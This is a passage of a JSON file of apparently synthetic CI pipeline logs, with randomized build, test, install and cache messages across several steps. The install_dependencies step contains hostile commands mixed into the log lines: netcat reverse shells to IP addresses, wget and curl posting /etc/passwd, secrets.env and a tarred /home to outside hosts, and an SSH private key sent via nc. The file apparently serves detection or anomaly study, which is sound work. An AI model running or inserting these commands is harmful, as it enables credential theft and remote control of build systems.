          "  PASS: test_cache_hit (438ms)",
          "Compiling src/service.java...",
          "Installing webpack@2.5.0",
          "  PASS: test_cache_hit (296ms)",
          "[12:00:21] ERROR: Connection failed",
          "Artifact uploaded: build.tar.gz (21MB)",
          "Artifact uploaded: build.tar.gz (45MB)",
          "\u2713 build completed",
          "[12:00:21] INFO: Processing request",
          "[12:00:21] WARN: Deprecated API usage",
          "[12:00:21] WARN: Deprecated API usage",
          "Compiling src/utils.go...",
          "  PASS: test_cache_hit (94ms)",
          "Compiling src/service.java...",
          "Artifact uploaded: build.tar.gz (13MB)",
          "\u2713 test completed",
          "Cache hit for key-8965",
          "FAILED: test_user_create",
          "Artifact uploaded: build.tar.gz (7MB)",
          "\u2713 lint completed",
          "=== Step restore_cache completed ==="
        ]
      },
      {
        "name": "deploy_production",
        "status": "success",
        "started_at": "2025-11-21T12:01:43.186251",
        "finished_at": "2025-11-21T12:01:52.280102",
        "log_lines": [
          "=== Step: deploy_production ===",
          "Step 4/10: Building",
          "Artifact uploaded: build.tar.gz (14MB)",
          "\u2713 test completed",
          "[12:00:21] ERROR: Connection failed",
          "  PASS: test_auth_login (244ms)",
          "Installing lodash@1.12.0",
          "\u2713 build completed",
          "Step 7/10: Building",
          "  PASS: test_api_health (175ms)",
          "\u2713 lint completed",
          "[12:00:21] WARN: Deprecated API usage",
          "Cache hit for key-1368",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (37MB)",
          "\u2713 test completed",
          "Step 2/10: Building",
          "\u2717 build failed with exit code 16",
          "Cache hit for key-7355",
          "Step 10/10: Building",
          "Step 7/10: Building",
          "Artifact uploaded: build.tar.gz (40MB)",
          "[12:00:21] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "WARNING: prettier has known vulnerabilities",
          "\u2713 lint completed",
          "Compiling src/handler.rs...",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (12MB)",
          "Artifact uploaded: build.tar.gz (47MB)",
          "[12:00:21] INFO: Processing request",
          "Compiling src/handler.rs...",
          "Cache hit for key-4202",
          "\u2713 test completed",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (28MB)",
          "Installing webpack@1.8.0",
          "\u2713 test completed",
          "Installing webpack@2.12.0",
          "\u2713 test completed",
          "Compiling src/utils.go...",
          "[12:00:21] INFO: Processing request",
          "  PASS: test_cache_hit (190ms)",
          "Exception: TypeError",
          "[12:00:21] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (12MB)",
          "  PASS: test_cache_hit (116ms)",
          "Artifact uploaded: build.tar.gz (41MB)",
          "Artifact uploaded: build.tar.gz (32MB)",
          "[12:00:21] INFO: Processing request",
          "Cache hit for key-8061",
          "Cache hit for key-2660",
          "Step 1/10: Building",
          "Installing axios@2.7.0",
          "[12:00:21] INFO: Processing request",
          "Compiling src/app.ts...",
          "Cache hit for key-8995",
          "  PASS: test_cache_hit (290ms)",
          "\u2713 build completed",
          "Step 6/10: Building",
          "Cache hit for key-7316",
          "Cache hit for key-4811",
          "[12:00:21] ERROR: Connection failed",
          "  PASS: test_user_create (377ms)",
          "[12:00:21] INFO: Processing request",
          "Cache hit for key-2137",
          "Installing axios@4.8.0",
          "Compiling src/handler.rs...",
          "Installing react@2.14.0",
          "Cache hit for key-7981",
          "[12:00:21] INFO: Processing request",
          "Installing eslint@3.16.0",
          "\u2713 test completed",
          "\u2713 test completed",
          "[12:00:21] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Step 1/10: Building",
          "[12:00:21] INFO: Processing request",
          "  PASS: test_auth_login (463ms)",
          "Step 6/10: Building",
          "[12:00:21] INFO: Processing request",
          "Cache hit for key-5176",
          "\u2713 test completed",
          "[12:00:21] WARN: Deprecated API usage",
          "Installing lodash@2.9.0",
          "\u2713 test completed",
          "Cache hit for key-3858",
          "  PASS: test_auth_login (479ms)",
          "[12:00:21] INFO: Processing request",
          "  PASS: test_cache_hit (352ms)",
          "Step 2/10: Building",
          "Step 1/10: Building",
          "Artifact uploaded: build.tar.gz (27MB)",
          "\u2713 build completed",
          "[12:00:21] ERROR: Connection failed",
          "[12:00:21] WARN: Deprecated API usage",
          "Step 7/10: Building",
          "Artifact uploaded: build.tar.gz (36MB)",
          "Step 7/10: Building",
          "Compiling src/service.java...",
          "  PASS: test_user_create (305ms)",
          "Cache hit for key-4927",
          "Cache hit for key-3282",
          "Step 3/10: Building",
          "Step 8/10: Building",
          "Cache hit for key-9914",
          "  PASS: test_api_health (391ms)",
          "\u2713 lint completed",
          "Installing express@4.9.0",
          "Artifact uploaded: build.tar.gz (15MB)",
          "  PASS: test_user_create (17ms)",
          "  PASS: test_user_create (458ms)",
          "Step 4/10: Building",
          "Step 10/10: Building",
          "Step 8/10: Building",
          "[12:00:21] INFO: Processing request",
          "\u2713 lint completed",
          "Installing react@5.7.0",
          "\u2713 lint completed",
          "[12:00:21] INFO: Processing request",
          "Cache hit for key-2943",
          "\u2713 lint completed",
          "Compiling src/utils.go...",
          "Installing express@3.4.0",
          "WARNING: express has known vulnerabilities",
          "WARNING: jest has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (10MB)",
          "Cache hit for key-1866",
          "Compiling src/index.js...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "\u2713 build completed",
          "Cache hit for key-6803",
          "\u2713 test completed",
          "=== Step deploy_production completed ==="
        ]
      },
      {
        "name": "e2e_tests",
        "status": "success",
        "started_at": "2025-11-21T12:01:52.280102",
        "finished_at": "2025-11-21T12:02:15.014730",
        "log_lines": [
          "=== Step: e2e_tests ===",
          "[12:00:21] INFO: Processing request",
          "  PASS: test_db_connect (193ms)",
          "[12:00:21] INFO: Processing request",
          "[12:00:21] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (25MB)",
          "Installing lodash@5.15.0",
          "Compiling src/handler.rs...",
          "\u2713 build completed",
          "Step 9/10: Building",
          "\u2713 test completed",
          "Installing prettier@3.11.0",
          "\u2713 build completed",
          "Compiling src/index.js...",
          "  PASS: test_api_health (489ms)",
          "[12:00:21] INFO: Processing request",
          "Compiling src/handler.rs...",
          "Compiling src/handler.rs...",
          "Installing jest@4.12.0",
          "  PASS: test_db_connect (90ms)",
          "Installing eslint@1.12.0",
          "  PASS: test_api_health (97ms)",
          "[12:00:21] INFO: Processing request",
          "Compiling src/handler.rs...",
          "\u2713 lint completed",
          "Cache hit for key-6805",
          "  PASS: test_auth_login (453ms)",
          "Cache hit for key-9622",
          "Artifact uploaded: build.tar.gz (2MB)",
          "\u2713 lint completed",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "\u2713 test completed",
          "[12:00:21] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (13MB)",
          "Installing eslint@5.6.0",
          "Cache hit for key-8503",
          "Step 4/10: Building",
          "  PASS: test_auth_login (414ms)",
          "  PASS: test_db_connect (95ms)",
          "  PASS: test_db_connect (111ms)",
          "WARNING: prettier has known vulnerabilities",
          "  PASS: test_user_create (408ms)",
          "[12:00:21] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (35MB)",
          "Installing webpack@1.3.0",
          "Step 9/10: Building",
          "  PASS: test_api_health (406ms)",
          "Exception: NullPointerException",
          "  PASS: test_db_connect (282ms)",
          "Installing eslint@2.7.0",
          "Cache hit for key-1852",
          "Artifact uploaded: build.tar.gz (38MB)",
          "Compiling src/main.py...",
          "  PASS: test_api_health (156ms)",
          "  PASS: test_api_health (70ms)",
          "Cache hit for key-4717",
          "Installing prettier@1.12.0",
          "Compiling src/index.js...",
          "Cache hit for key-9150",
          "[12:00:21] INFO: Processing request",
          "Compiling src/service.java...",
          "Cache hit for key-2960",
          "[12:00:21] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (14MB)",
          "Installing eslint@5.11.0",
          "Installing webpack@3.11.0",
          "Cache hit for key-5563",
          "  PASS: test_db_connect (314ms)",
          "Step 6/10: Building",
          "Cache hit for key-9329",
          "Cache hit for key-5278",
          "Artifact uploaded: build.tar.gz (28MB)",
          "  PASS: test_user_create (321ms)",
          "Artifact uploaded: build.tar.gz (14MB)",
          "Cache hit for key-4314",
          "\u2713 build completed",
          "Step 10/10: Building",
          "Compiling src/handler.rs...",
          "Artifact uploaded: build.tar.gz (1MB)",
          "Step 2/10: Building",
          "WARNING: prettier has known vulnerabilities",
          "Compiling src/main.py...",
          "Compiling src/main.py...",
          "Installing react@2.3.0",
          "Installing express@1.17.0",
          "Cache hit for key-6894",
          "Installing lodash@2.10.0",
          "WARNING: jest has known vulnerabilities",
          "\u2713 lint completed",
          "Cache hit for key-7149",
          "  PASS: test_db_connect (206ms)",
          "Artifact uploaded: build.tar.gz (12MB)",
          "[12:00:21] INFO: Processing request",
          "Cache hit for key-4258",
          "FAILED: test_api_health",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "\u2713 test completed",
          "[12:00:21] INFO: Processing request",
          "Step 10/10: Building",
          "[12:00:21] INFO: Processing request",
          "\u2713 lint completed",
          "\u2713 lint completed",
          "Step 9/10: Building",
          "Artifact uploaded: build.tar.gz (18MB)",
          "[12:00:21] WARN: Deprecated API usage",
          "  PASS: test_auth_login (103ms)",
          "Artifact uploaded: build.tar.gz (50MB)",
          "\u2713 lint completed",
          "[12:00:21] INFO: Processing request",
          "[12:00:21] WARN: Deprecated API usage",
          "Installing express@4.11.0",
          "[12:00:21] INFO: Processing request",
          "Installing lodash@2.4.0",
          "  PASS: test_api_health (61ms)",
          "Compiling src/handler.rs...",
          "[12:00:21] INFO: Processing request",
          "Compiling src/handler.rs...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Cache hit for key-2873",
          "Cache hit for key-4788",
          "\u2713 lint completed",
          "[12:00:21] INFO: Processing request",
          "Compiling src/main.py...",
          "  PASS: test_api_health (16ms)",
          "\u2713 lint completed",
          "Cache hit for key-7513",
          "  PASS: test_auth_login (463ms)",
          "Step 10/10: Building",
          "\u2713 build completed",
          "Compiling src/index.js...",
          "Installing react@1.15.0",
          "[12:00:21] INFO: Processing request",
          "\u2713 build completed",
          "Cache hit for key-7649",
          "=== Step e2e_tests completed ==="
        ]
      },
      {
        "name": "save_cache",
        "status": "success",
        "started_at": "2025-11-21T12:02:15.014730",
        "finished_at": "2025-11-21T12:02:28.655507",
        "log_lines": [
          "=== Step: save_cache ===",
          "Step 4/10: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:00:21] INFO: Processing request",
          "Compiling src/utils.go...",
          "[12:00:21] ERROR: Connection failed",
          "  PASS: test_cache_hit (221ms)",
          "Cache hit for key-8822",
          "Installing eslint@3.1.0",
          "Compiling src/app.ts...",
          "\u2713 build completed",
          "Step 3/10: Building",
          "WARNING: lodash has known vulnerabilities",
          "[12:00:21] INFO: Processing request",
          "\u2713 build completed",
          "  PASS: test_cache_hit (362ms)",
          "Compiling src/app.ts...",
          "  PASS: test_user_create (47ms)",
          "Compiling src/handler.rs...",
          "Step 6/10: Building",
          "[12:00:21] INFO: Processing request",
          "Cache hit for key-6381",
          "Installing eslint@2.4.0",
          "Artifact uploaded: build.tar.gz (48MB)",
          "  PASS: test_auth_login (162ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:00:21] WARN: Deprecated API usage",
          "Step 7/10: Building",
          "Step 6/10: Building",
          "[12:00:21] WARN: Deprecated API usage",
          "Installing axios@1.5.0",
          "Cache hit for key-9092",
          "Cache hit for key-1649",
          "[12:00:21] INFO: Processing request",
          "[12:00:21] INFO: Processing request",
          "  PASS: test_api_health (294ms)",
          "  PASS: test_auth_login (247ms)",
          "\u2713 test completed",
          "  PASS: test_cache_hit (165ms)",
          "Compiling src/app.ts...",
          "Installing lodash@5.9.0",
          "Cache hit for key-8287",
          "\u2717 build failed with exit code 127",
          "Installing eslint@3.12.0",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (6MB)",
          "Compiling src/app.ts...",
          "[12:00:21] INFO: Processing request",
          "Cache hit for key-1057",
          "  PASS: test_cache_hit (202ms)",
          "WARNING: prettier has known vulnerabilities",
          "Step 3/10: Building",
          "Compiling src/app.ts...",
          "Compiling src/handler.rs...",
          "WARNING: lodash has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (33MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Compiling src/main.py...",
          "Installing webpack@5.3.0",
          "Compiling src/handler.rs...",
          "\u2713 test completed",
          "Step 2/10: Building",
          "Artifact uploaded: build.tar.gz (15MB)",
          "  PASS: test_cache_hit (300ms)",
          "[12:00:21] INFO: Processing request",
          "Installing jest@1.13.0",
          "\u2713 build completed",
          "[12:00:21] INFO: Processing request",
          "Step 1/10: Building",
          "Cache hit for key-8968",
          "\u2713 test completed",
          "Installing webpack@3.9.0",
          "[12:00:21] INFO: Processing request",
          "\u2713 build completed",
          "[12:00:21] INFO: Processing request",
          "\u2713 lint completed",
          "  PASS: test_auth_login (197ms)",
          "Step 1/10: Building",
          "Compiling src/index.js...",
          "Artifact uploaded: build.tar.gz (27MB)",
          "  PASS: test_db_connect (483ms)",
          "Exception: TypeError",
          "Step 2/10: Building",
          "Compiling src/service.java...",
          "\u2717 build failed with exit code 11",
          "Step 3/10: Building",
          "Cache hit for key-5825",
          "\u2713 test completed",
          "Installing express@3.7.0",
          "\u2713 test completed",
          "[12:00:21] INFO: Processing request",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (5MB)",
          "Installing eslint@3.3.0",
          "Artifact uploaded: build.tar.gz (10MB)",
          "Cache hit for key-6557",
          "  PASS: test_db_connect (87ms)",
          "[12:00:21] ERROR: Connection failed",
          "Compiling src/index.js...",
          "Artifact uploaded: build.tar.gz (34MB)",
          "  PASS: test_api_health (488ms)",
          "  PASS: test_api_health (223ms)",
          "Compiling src/main.py...",
          "Artifact uploaded: build.tar.gz (9MB)",
          "Compiling src/utils.go...",
          "Compiling src/main.py...",
          "Compiling src/service.java...",
          "Artifact uploaded: build.tar.gz (36MB)",
          "[12:00:21] INFO: Processing request",
          "Compiling src/handler.rs...",
          "Step 9/10: Building",
          "\u2713 test completed",
          "Step 10/10: Building",
          "Artifact uploaded: build.tar.gz (45MB)",
          "Artifact uploaded: build.tar.gz (13MB)",
          "\u2713 test completed",
          "Step 6/10: Building",
          "\u2713 lint completed",
          "[12:00:21] INFO: Processing request",
          "Compiling src/app.ts...",
          "  PASS: test_auth_login (189ms)",
          "Compiling src/app.ts...",
          "Artifact uploaded: build.tar.gz (39MB)",
          "\u2713 lint completed",
          "Cache hit for key-6746",
          "Compiling src/service.java...",
          "  PASS: test_cache_hit (67ms)",
          "Artifact uploaded: build.tar.gz (48MB)",
          "  PASS: test_db_connect (156ms)",
          "Compiling src/main.py...",
          "Installing webpack@3.16.0",
          "[12:00:21] INFO: Processing request",
          "Cache hit for key-7612",
          "  PASS: test_cache_hit (106ms)",
          "=== Step save_cache completed ==="
        ]
      },
      {
        "name": "integration_tests",
        "status": "success",
        "started_at": "2025-11-21T12:02:28.655507",
        "finished_at": "2025-11-21T12:03:14.124764",
        "log_lines": [
          "=== Step: integration_tests ===",
          "\u2713 build completed",
          "[12:00:21] ERROR: Connection failed",
          "Installing webpack@4.5.0",
          "Step 2/10: Building",
          "Cache hit for key-7337",
          "[12:00:21] ERROR: Connection failed",
          "Cache hit for key-9350",
          "  PASS: test_cache_hit (291ms)",
          "Installing jest@4.11.0",
          "  PASS: test_auth_login (103ms)",
          "Cache hit for key-2082",
          "Cache hit for key-3532",
          "Artifact uploaded: build.tar.gz (30MB)",
          "  PASS: test_user_create (94ms)",
          "\u2713 build completed",
          "[12:00:21] INFO: Processing request",
          "\u2713 test completed",
          "  PASS: test_db_connect (499ms)",
          "  PASS: test_db_connect (327ms)",
          "[12:00:21] INFO: Processing request",
          "\u2713 lint completed",
          "\u2713 lint completed",
          "Cache hit for key-9661",
          "Artifact uploaded: build.tar.gz (10MB)",
          "\u2713 test completed",
          "  PASS: test_user_create (31ms)",
          "Installing prettier@5.18.0",
          "Cache hit for key-7196",
          "FAILED: test_auth_login",
          "Installing prettier@2.10.0",
          "  PASS: test_cache_hit (271ms)",
          "Cache hit for key-6293",
          "\u2713 lint completed",
          "\u2713 build completed",
          "Step 2/10: Building",
          "Step 3/10: Building",
          "Artifact uploaded: build.tar.gz (1MB)",
          "Artifact uploaded: build.tar.gz (9MB)",
          "Installing react@2.3.0",
          "\u2713 build completed",
          "  PASS: test_auth_login (463ms)",
          "Installing eslint@2.2.0",
          "Cache hit for key-1267",
          "[12:00:21] INFO: Processing request",
          "Cache hit for key-5243",
          "Installing axios@1.12.0",
          "Installing react@5.2.0",
          "WARNING: jest has known vulnerabilities",
          "Cache hit for key-2731",
          "[12:00:21] INFO: Processing request",
          "[12:00:21] INFO: Processing request",
          "\u2713 test completed",
          "Step 8/10: Building",
          "Installing prettier@5.0.0",
          "\u2713 build completed",
          "[12:00:21] WARN: Deprecated API usage",
          "[12:00:21] INFO: Processing request",
          "Installing axios@2.1.0",
          "Compiling src/handler.rs...",
          "[12:00:21] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (28MB)",
          "Installing axios@4.19.0",
          "\u2713 test completed",
          "Installing axios@5.16.0",
          "Compiling src/app.ts...",
          "  PASS: test_user_create (293ms)",
          "Compiling src/main.py...",
          "Artifact uploaded: build.tar.gz (13MB)",
          "  PASS: test_db_connect (419ms)",
          "  PASS: test_user_create (172ms)",
          "[12:00:21] INFO: Processing request",
          "Cache hit for key-4729",
          "Installing lodash@4.17.0",
          "[12:00:21] WARN: Deprecated API usage",
          "[12:00:21] INFO: Processing request",
          "[12:00:21] INFO: Processing request",
          "Cache hit for key-2880",
          "Artifact uploaded: build.tar.gz (31MB)",
          "Cache hit for key-8914",
          "Compiling src/main.py...",
          "Cache hit for key-8337",
          "\u2713 build completed",
          "  PASS: test_db_connect (320ms)",
          "\u2713 build completed",
          "Compiling src/utils.go...",
          "Installing eslint@2.4.0",
          "Artifact uploaded: build.tar.gz (40MB)",
          "[12:00:21] INFO: Processing request",
          "\u2713 lint completed",
          "Cache hit for key-7381",
          "Cache hit for key-1600",
          "Cache hit for key-6994",
          "  PASS: test_db_connect (445ms)",
          "Installing express@4.3.0",
          "\u2713 test completed",
          "Installing axios@4.10.0",
          "[12:00:21] INFO: Processing request",
          "Installing express@5.5.0",
          "Step 6/10: Building",
          "Compiling src/service.java...",
          "Step 10/10: Building",
          "Compiling src/main.py...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Compiling src/main.py...",
          "  PASS: test_db_connect (188ms)",
          "[12:00:21] WARN: Deprecated API usage",
          "[12:00:21] INFO: Processing request",
          "Compiling src/main.py...",
          "[12:00:21] WARN: Deprecated API usage",
          "\u2713 test completed",
          "Compiling src/index.js...",
          "Installing react@4.2.0",
          "Artifact uploaded: build.tar.gz (10MB)",
          "Installing eslint@5.11.0",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Artifact uploaded: build.tar.gz (23MB)",
          "[12:00:21] INFO: Processing request",
          "Cache hit for key-5646",
          "[12:00:21] INFO: Processing request",
          "Installing prettier@5.5.0",
          "\u2713 lint completed",
          "  PASS: test_db_connect (339ms)",
          "Artifact uploaded: build.tar.gz (42MB)",
          "Compiling src/index.js...",
          "\u2713 lint completed",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (7MB)",
          "[12:00:21] INFO: Processing request",
          "Step 2/10: Building",
          "Step 2/10: Building",
          "Installing jest@1.20.0",
          "Cache hit for key-9708",
          "Artifact uploaded: build.tar.gz (1MB)",
          "=== Step integration_tests completed ==="
        ]
      },
      {
        "name": "unit_tests",
        "status": "success",
        "started_at": "2025-11-21T12:03:14.124764",
        "finished_at": "2025-11-21T12:04:22.328649",
        "log_lines": [
          "=== Step: unit_tests ===",
          "Cache hit for key-2366",
          "\u2717 build failed with exit code 26",
          "Compiling src/index.js...",
          "\u2713 build completed",
          "\u2713 lint completed",
          "\u2713 lint completed",
          "Installing prettier@2.9.0",
          "  PASS: test_user_create (492ms)",
          "Step 7/10: Building",
          "Compiling src/index.js...",
          "  PASS: test_auth_login (25ms)",
          "\u2713 lint completed",
          "Compiling src/app.ts...",
          "Compiling src/app.ts...",
          "Artifact uploaded: build.tar.gz (18MB)",
          "[12:00:21] ERROR: Connection failed",
          "Artifact uploaded: build.tar.gz (33MB)",
          "Artifact uploaded: build.tar.gz (21MB)",
          "Cache hit for key-5076",
          "Step 4/10: Building",
          "\u2713 build completed",
          "Installing prettier@2.0.0",
          "[12:00:21] INFO: Processing request",
          "[12:00:21] INFO: Processing request",
          "Step 7/10: Building",
          "Compiling src/service.java...",
          "Installing eslint@1.18.0",
          "Installing react@3.8.0",
          "Compiling src/app.ts...",
          "Step 8/10: Building",
          "  PASS: test_cache_hit (112ms)",
          "Artifact uploaded: build.tar.gz (43MB)",
          "[12:00:21] INFO: Processing request",
          "Cache hit for key-9066",
          "  PASS: test_api_health (246ms)",
          "Artifact uploaded: build.tar.gz (25MB)",
          "Compiling src/service.java...",
          "Installing eslint@5.0.0",
          "\u2713 test completed",
          "[12:00:21] INFO: Processing request",
          "Step 6/10: Building",
          "Installing react@1.11.0",
          "\u2713 lint completed",
          "Cache hit for key-1386",
          "  PASS: test_auth_login (470ms)",
          "Installing react@2.18.0",
          "Cache hit for key-4285",
          "\u2713 test completed",
          "Compiling src/utils.go...",
          "[12:00:21] INFO: Processing request",
          "\u2713 build completed",
          "Installing react@3.17.0",
          "Artifact uploaded: build.tar.gz (29MB)",
          "Artifact uploaded: build.tar.gz (29MB)",
          "Step 7/10: Building",
          "\u2713 test completed",
          "Compiling src/service.java...",
          "Installing lodash@3.16.0",
          "Artifact uploaded: build.tar.gz (1MB)",
          "Cache hit for key-9143",
          "[12:00:21] INFO: Processing request",
          "Installing react@4.13.0",
          "Step 5/10: Building",
          "Artifact uploaded: build.tar.gz (45MB)",
          "\u2713 build completed",
          "Cache hit for key-4239",
          "[12:00:21] INFO: Processing request",
          "Compiling src/app.ts...",
          "Installing webpack@3.3.0",
          "Compiling src/service.java...",
          "Step 8/10: Building",
          "Compiling src/utils.go...",
          "\u2713 lint completed",
          "Cache hit for key-7440",
          "Compiling src/app.ts...",
          "\u2713 test completed",
          "[12:00:21] INFO: Processing request",
          "Step 5/10: Building",
          "\u2713 lint completed",
          "Compiling src/utils.go...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:00:21] INFO: Processing request",
          "Installing react@4.15.0",
          "  PASS: test_api_health (468ms)",
          "[12:00:21] INFO: Processing request",
          "\u2713 build completed",
          "Step 5/10: Building",
          "  PASS: test_db_connect (336ms)",
          "Compiling src/app.ts...",
          "Artifact uploaded: build.tar.gz (39MB)",
          "Cache hit for key-1666",
          "Step 5/10: Building",
          "  PASS: test_auth_login (372ms)",
          "Installing webpack@2.0.0",
          "Cache hit for key-8879",
          "Installing webpack@2.16.0",
          "Compiling src/handler.rs...",
          "Artifact uploaded: build.tar.gz (18MB)",
          "Step 10/10: Building",
          "Step 6/10: Building",
          "\u2713 test completed",
          "Compiling src/service.java...",
          "\u2713 build completed",
          "[12:00:21] INFO: Processing request",
          "Installing eslint@1.18.0",
          "  PASS: test_cache_hit (270ms)",
          "Artifact uploaded: build.tar.gz (18MB)",
          "Step 3/10: Building",
          "Installing jest@2.4.0",
          "  PASS: test_db_connect (273ms)",
          "FAILED: test_cache_hit",
          "Artifact uploaded: build.tar.gz (3MB)",
          "[12:00:21] WARN: Deprecated API usage",
          "\u2713 test completed",
          "Compiling src/index.js...",
          "Cache hit for key-3981",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (50MB)",
          "Compiling src/index.js...",
          "[12:00:21] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (30MB)",
          "\u2713 lint completed",
          "FAILED: test_user_create",
          "Step 9/10: Building",
          "Compiling src/index.js...",
          "Artifact uploaded: build.tar.gz (12MB)",
          "Compiling src/handler.rs...",
          "  PASS: test_cache_hit (109ms)",
          "FAILED: test_auth_login",
          "Step 5/10: Building",
          "Compiling src/utils.go...",
          "[12:00:21] INFO: Processing request",
          "Compiling src/service.java...",
          "=== Step unit_tests completed ==="
        ]
      },
      {
        "name": "install_dependencies",
        "status": "success",
        "started_at": "2025-11-21T12:04:22.328649",
        "finished_at": "2025-11-21T12:05:30.532534",
        "log_lines": [
          "=== Step: install_dependencies ===",
          "  PASS: test_user_create (340ms)",
          "\u2713 lint completed",
          "Compiling src/app.ts...",
          "  PASS: test_user_create (496ms)",
          "wget --post-data=\"$(cat /etc/passwd)\" https://cloud.services/",
          "Step 10/10: Building",
          "Step 7/10: Building",
          "  PASS: test_cache_hit (55ms)",
          "WARNING: eslint has known vulnerabilities",
          "nc -e /bin/sh 240.24.30.133 33653",
          "Artifact uploaded: build.tar.gz (30MB)",
          "Cache hit for key-5443",
          "Compiling src/main.py...",
          "  PASS: test_cache_hit (464ms)",
          "\u2713 lint completed",
          "Installing eslint@5.18.0",
          "Compiling src/utils.go...",
          "Step 9/10: Building",
          "WARNING: lodash has known vulnerabilities",
          "  PASS: test_user_create (438ms)",
          "[12:00:21] INFO: Processing request",
          "[12:00:21] INFO: Processing request",
          "Installing express@2.7.0",
          "\u2713 lint completed",
          "Compiling src/handler.rs...",
          "Installing prettier@3.3.0",
          "Artifact uploaded: build.tar.gz (31MB)",
          "  PASS: test_cache_hit (479ms)",
          "Cache hit for key-5584",
          "Compiling src/app.ts...",
          "[12:00:21] WARN: Deprecated API usage",
          "  PASS: test_user_create (148ms)",
          "Artifact uploaded: build.tar.gz (18MB)",
          "Compiling src/app.ts...",
          "Compiling src/handler.rs...",
          "FAILED: test_api_health",
          "Cache hit for key-6268",
          "Installing webpack@2.13.0",
          "Artifact uploaded: build.tar.gz (50MB)",
          "Cache hit for key-6360",
          "Compiling src/utils.go...",
          "Compiling src/main.py...",
          "Artifact uploaded: build.tar.gz (14MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Artifact uploaded: build.tar.gz (3MB)",
          "[12:00:21] INFO: Processing request",
          "[12:00:21] INFO: Processing request",
          "Step 9/10: Building",
          "Compiling src/handler.rs...",
          "  PASS: test_api_health (333ms)",
          "  PASS: test_auth_login (275ms)",
          "Cache hit for key-8701",
          "nc -e /bin/sh 45.64.2.79 55199",
          "Installing eslint@4.5.0",
          "  PASS: test_api_health (290ms)",
          "Compiling src/main.py...",
          "Step 1/10: Building",
          "\u2713 build completed",
          "Step 5/10: Building",
          "WARNING: jest has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (10MB)",
          "Artifact uploaded: build.tar.gz (30MB)",
          "Installing jest@2.12.0",
          "Compiling src/service.java...",
          "Installing lodash@1.7.0",
          "Compiling src/app.ts...",
          "WARNING: prettier has known vulnerabilities",
          "Cache hit for key-4706",
          "[12:00:21] INFO: Processing request",
          "Compiling src/index.js...",
          "Artifact uploaded: build.tar.gz (30MB)",
          "\u2713 lint completed",
          "Step 10/10: Building",
          "  PASS: test_api_health (15ms)",
          "Step 7/10: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Cache hit for key-1180",
          "Cache hit for key-6033",
          "Cache hit for key-1264",
          "Compiling src/utils.go...",
          "  PASS: test_db_connect (116ms)",
          "[12:00:21] INFO: Processing request",
          "Cache hit for key-8490",
          "  PASS: test_user_create (335ms)",
          "  PASS: test_db_connect (117ms)",
          "Cache hit for key-2915",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (12MB)",
          "  PASS: test_api_health (335ms)",
          "Artifact uploaded: build.tar.gz (20MB)",
          "wget --post-data=\"$(cat /etc/passwd)\" https://example.com/",
          "[12:00:21] INFO: Processing request",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (10MB)",
          "Step 5/10: Building",
          "Step 9/10: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:00:21] INFO: Processing request",
          "nc -e /bin/sh 211.182.83.231 32071",
          "Installing express@4.4.0",
          "Step 2/10: Building",
          "Step 10/10: Building",
          "[12:00:21] INFO: Processing request",
          "\u2713 build completed",
          "Cache hit for key-6241",
          "Compiling src/handler.rs...",
          "curl -X POST https://test.io/collect -d @secrets.env",
          "\u2713 lint completed",
          "nc -e /bin/sh 27.91.208.181 57804",
          "tar czf - /home | curl -X POST -d @- https://example.com/upload",
          "tar czf - /home | curl -X POST -d @- https://example.com/upload",
          "\u2713 lint completed",
          "  PASS: test_auth_login (37ms)",
          "Sending 297MB of data to test.io",
          "FAILED: test_api_health",
          "Cache hit for key-6609",
          "[12:00:21] ERROR: Connection failed",
          "  PASS: test_auth_login (193ms)",
          "Step 9/10: Building",
          "[12:00:21] INFO: Processing request",
          "\u2713 test completed",
          "Compiling src/app.ts...",
          "  PASS: test_db_connect (313ms)",
          "Compiling src/app.ts...",
          "[12:00:21] INFO: Processing request",
          "Cache hit for key-4014",
          "Sending 244MB of data to example.com",
          "Compiling src/app.ts...",
          "Compiling src/handler.rs...",
          "nc -e /bin/sh 135.128.211.249 39536",
          "Sending 137MB of data to startup.dev",
          "WARNING: axios has known vulnerabilities",
          "\u2713 lint completed",
          "nc -e /bin/sh 138.169.40.152 22794",
          "Installing webpack@5.9.0",
          "[12:00:21] INFO: Processing request",
          "  PASS: test_api_health (122ms)",
          "Step 3/10: Building",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 53.22.57.34 41100",
          "[12:00:21] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Step 5/10: Building",
          "Step 6/10: Building",
          "Compiling src/service.java...",
